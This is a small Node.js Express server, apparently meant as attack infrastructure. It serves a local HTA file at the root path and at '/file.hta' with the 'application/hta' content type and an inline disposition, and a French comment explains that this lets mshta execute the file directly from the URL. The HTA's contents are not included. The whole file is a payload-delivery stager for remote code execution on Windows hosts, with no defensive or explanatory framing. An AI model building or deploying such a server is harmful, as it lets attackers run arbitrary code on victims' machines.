const express = require("express");
const path = require("path");

const app = express();

const HTA_PATH = path.join(__dirname, "file.hta");

// application/hta + inline => mshta exécute directement depuis l'URL
function sendHta(req, res) {
  res.type("application/hta");
  res.setHeader("Content-Disposition", 'inline; filename="file.hta"');

  res.sendFile(HTA_PATH, (err) => {
    if (err) {
      console.error(err);
      if (!res.headersSent) {
        res.status(404).send("File not found.");
      }
    }
  });
}

app.get("/", sendHta);
app.get("/file.hta", sendHta);

const PORT = process.env.PORT || 3000;

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});
